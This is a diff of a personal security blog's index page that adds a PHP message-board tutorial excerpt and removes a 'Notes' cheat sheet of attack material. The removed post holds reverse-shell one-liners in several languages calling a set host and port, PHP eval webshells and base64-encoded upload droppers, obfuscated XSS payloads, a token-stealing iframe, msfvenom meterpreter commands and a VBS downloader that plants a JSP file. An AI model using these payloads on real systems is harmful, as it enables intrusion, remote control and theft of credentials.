@@ -330,6 +330,158 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content="Freedom as Autonomy">
+      <meta itemprop="image" content="/images/cat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/24/Create-Message-Board-with-PHP/" class="post-title-link" itemprop="url">'使用PHP编写留言板'</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-24 15:36:54 / Modified: 21:19:08" itemprop="dateCreated datePublished" datetime="2019-03-24T15:36:54+08:00">2019-03-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="PHP留言板结构"><a href="#PHP留言板结构" class="headerlink" title="PHP留言板结构"></a>PHP留言板结构</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/01.Structure.png">
+<h1 id="1-新建Message类"><a href="#1-新建Message类" class="headerlink" title="1.新建Message类"></a>1.新建Message类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Message&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $time;</span><br><span class="line">	public $content;</span><br><span class="line"></span><br><span class="line">	function __construct($n,$t,$c)&#123;</span><br><span class="line">		$this-&gt;name=$n;</span><br><span class="line">		$this-&gt;time=$t;</span><br><span class="line">		$this-&gt;content=$c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function show()&#123;</span><br><span class="line">		echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。<br>在创建对象时，构造函数使将值赋给对象的3个属性。<br>show()方法则是显示留言内容。</p>
+<h1 id="2-新建MessageBoard类"><a href="#2-新建MessageBoard类" class="headerlink" title="2.新建MessageBoard类"></a>2.新建MessageBoard类</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/02.MessageBoard.png">
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/24/Create-Message-Board-with-PHP/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1079,245 +1231,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2009/12/31/Notes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content="Freedom as Autonomy">
-      <meta itemprop="image" content="/images/cat.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Emerald Dream">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2009/12/31/Notes/" class="post-title-link" itemprop="url">'Notes'</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2009-12-31 19:41:10" itemprop="dateCreated datePublished" datetime="2009-12-31T19:41:10+08:00">2009-12-31</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-07-13 14:05:09" itemprop="dateModified" datetime="2019-07-13T14:05:09+08:00">2019-07-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>1.查看源代码<br>2.查看robots.txt</p>
-<h2 id="linux下空格绕过"><a href="#linux下空格绕过" class="headerlink" title="linux下空格绕过"></a>linux下空格绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br></pre></td></tr></table></figure>
-<p><code>${IFS}</code><br> Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.</p>
-<h2 id="PHP-is-numeric-绕过"><a href="#PHP-is-numeric-绕过" class="headerlink" title="PHP is_numeric 绕过"></a>PHP is_numeric 绕过</h2><p>使用十六进制绕过</p>
-<h2 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r picture text</span><br></pre></td></tr></table></figure>
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>python导入bash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
-<p>设置ssh使用root登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>
-<p>开机启动ssh服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable</span><br></pre></td></tr></table></figure>
-<p>bash_history</p>
-<p>复制粘贴</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复制命令：Ctrl + Shift + C</span><br><span class="line">粘贴命令：Ctrl + Shift + V</span><br><span class="line">复制命令：Ctrl|Shift + Insert|用鼠标选中</span><br><span class="line">粘贴命令：Crtl|Shift + Insert|单击鼠标滚轮</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + 鼠标选中后粘贴会立即执行</span><br></pre></td></tr></table></figure>
-<p>\$()和\${}</p>
-<p>\$()是变量替换<br>\${}是命令替换</p>
-<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd -d &quot;/home/chessur&quot; -m -s &quot;/bin/bash&quot; chessur</span><br><span class="line">//指定家目录</span><br><span class="line">//-m 若家目录不存在，则强制创建家目录</span><br><span class="line">//-s 指定shell</span><br></pre></td></tr></table></figure>
-<h2 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ufw default deny //设置端口默认关闭</span><br><span class="line">ufw status //查看ufw状态</span><br><span class="line">ufw allow port //放行端口</span><br><span class="line">ufw enable //开启ufw</span><br></pre></td></tr></table></figure>
-<h2 id="单用户模式"><a href="#单用户模式" class="headerlink" title="单用户模式"></a>单用户模式</h2><p>开机选advanced，按e，找到<code>ro recovery nomodeset</code>，修改为<code>rw single init=/bin/bash</code> ，修改之后按F10或Ctrl+X进入单用户模式</p>
-<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="更改secure-file-priv"><a href="#更改secure-file-priv" class="headerlink" title="更改secure_file_priv"></a>更改secure_file_priv</h3><p>没有my.ini，my.cnf里什么都没有，MySQL版本5.7.26</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv=&apos;&apos;</span><br></pre></td></tr></table></figure>
-<p>参考：<br><a href="https://serverfault.com/questions/820447/cant-set-secure-file-priv-on-mysql-5-7-ubuntu-16-04" target="_blank" rel="noopener">can’t set secure_file_priv on mysql 5.7 Ubuntu 16.04</a></p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.126.1/6666 0&gt;&amp;1</span><br><span class="line">bash -i 5&lt;&gt;/dev/tcp/192.168.126.1/6666 0&gt;&amp;5 1&gt;&amp;5</span><br></pre></td></tr></table></figure>
-<h2 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.126.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.1&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.126.1&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;192.168.126.1&quot;,6666).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.126.1 6666</span><br></pre></td></tr></table></figure>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.126.1 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.126.1/6666;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line">&lt;?PHP fputs(fopen(&apos;windy.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[windy])?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
-<p>图片反弹Shell</p>
-<p>工具：<a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.1 LPORT=6666 -f psh-reflection  -o /root/image_shell.ps1</span><br></pre></td></tr></table></figure>
-<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x0000000074:alert(1)</span><br></pre></td></tr></table></figure>
-<p><code>&amp;#x0000</code>空子节</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.__$+&quot;)&quot;+&quot;\&quot;&quot;)())()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>url转码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3C%73%63%72%69%70%74%3E%24%3D%7E%5B%5D%3B%24%3D%7B%5F%5F%5F%3A%2B%2B%24%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%5F%24%3A%2B%2B%24%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%24%5F%3A%2B%2B%24%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%24%3A%28%24%5B%24%5D%2B%22%22%29%5B%24%5D%2C%5F%24%24%3A%2B%2B%24%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5B%24%5D%2C%24%5F%5F%3A%2B%2B%24%2C%24%5F%24%3A%2B%2B%24%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24%5F%5F%5F%3A%2B%2B%24%2C%24%5F%5F%24%3A%2B%2B%24%7D%3B%24%2E%24%5F%3D%28%24%2E%24%5F%3D%24%2B%22%22%29%5B%24%2E%24%5F%24%5D%2B%28%24%2E%5F%24%3D%24%2E%24%5F%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%24%24%3D%28%24%2E%24%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%28%21%24%29%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%28%24%2E%5F%5F%3D%24%2E%24%5F%5B%24%2E%24%24%5F%5D%29%2B%28%24%2E%24%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%5F%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%5F%5D%29%2B%24%2E%24%5F%5B%24%2E%24%5F%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%24%2B%24%2E%24%3B%24%2E%24%24%3D%24%2E%24%2B%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%2B%24%2E%24%2B%24%2E%24%24%3B%24%2E%24%3D%28%24%2E%5F%5F%5F%29%5B%24%2E%24%5F%5D%5B%24%2E%24%5F%5D%3B%24%2E%24%28%24%2E%24%28%24%2E%24%24%2B%22%5C%22%22%2B%24%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5B%24%2E%5F%24%5F%5D%2B%24%2E%24%24%24%5F%2B%22%5C%5C%22%2B%24%2E%5F%5F%24%2B%24%2E%24%24%5F%2B%24%2E%5F%24%5F%2B%24%2E%5F%5F%2B%22%28%22%2B%24%2E%5F%5F%24%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75String.fromCharCode(49);\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75String.fromCharCode(%34%39);\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%39%29%3b\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>获取usertoken</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure>
-<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>写一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydXaW5keSddKT8+|base64 -d &gt; upload/1.php` ;?&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;./Windy.php&apos;,&apos;w&apos;),base64_decode(&apos;PD9waHAgZXZhbCgkX1BPU1RbV2luZHldKTs/Pg==&apos;));?&gt;</span><br></pre></td></tr></table></figure>
-<p>一句话写上传马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">if (empty ($file))&#123;</span><br><span class="line">echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\n&quot;;echo &quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\n&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
-<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-<p>生成php反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.126.126 lport=126 -f raw -o reverse_shell.php</span><br><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>命令行导入数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pPassword databasename &lt; filedir</span><br></pre></td></tr></table></figure>
-<h1 id="后台拿Shell"><a href="#后台拿Shell" class="headerlink" title="后台拿Shell"></a>后台拿Shell</h1><p>修改模板代码</p>
-<p>修改上传图片格式</p>
-<p>上传模板若会自动解压，可以上传zip压缩包</p>
-<h1 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h1><h2 id="WebShell的权限"><a href="#WebShell的权限" class="headerlink" title="WebShell的权限"></a>WebShell的权限</h2><p>Webshell的权限一般是由解析执行WebShell的Web容器自身权限决定的<br>如果是linux做了操作系统加固 能上传 但是只能执行系统命令权限 但是无法获得shell那就说明做了目录权限加固但是没有做中间件加固（可上传）没做操作系统加固<br>目录加固的权限是可读可执行但不可写</p>
-<h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="PowerShell提权"><a href="#PowerShell提权" class="headerlink" title="PowerShell提权"></a>PowerShell提权</h2><h2 id="DOS下载文件"><a href="#DOS下载文件" class="headerlink" title="DOS下载文件"></a>DOS下载文件</h2><h3 id="1-创建downfile-vbs下载文件"><a href="#1-创建downfile-vbs下载文件" class="headerlink" title="1.创建downfile.vbs下载文件"></a>1.创建downfile.vbs下载文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs</span><br><span class="line">cscript downfile.vbs http://192.168.40.13:9090/fileLibrary/5d5X9mSTZXjH9VlhXNN/x.txt D:\\tomcat8.5\\webapps\\x.jsp</span><br></pre></td></tr></table></figure>
